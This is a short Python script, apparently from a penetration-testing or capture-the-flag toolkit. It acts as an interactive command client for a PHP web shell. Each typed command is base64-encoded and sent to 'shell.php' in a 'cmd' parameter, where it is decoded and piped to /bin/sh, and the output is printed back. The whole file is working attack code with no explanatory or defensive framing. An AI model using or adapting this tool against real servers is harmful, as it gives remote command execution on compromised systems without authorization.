#!/usr/bin/python3
import requests, sys, signal, time
from base64 import b64encode
def sig_handler(sig, frame):
	print("\n\n[*] Exiting...\n")
	sys.exit(0)
signal.signal(signal.SIGINT, sig_handler)
def RunCmd(cmd):
	cmd = cmd.encode('utf-8')
	cmd = b64encode(cmd).decode('utf-8')
	payload = {
		'cmd' : 'echo "%s" | base64 -d | /bin/sh' % (cmd)
	}
	result = requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text
	return result
while True:
	cmd = input("$~ ")
	response = RunCmd(cmd)
	print(response)
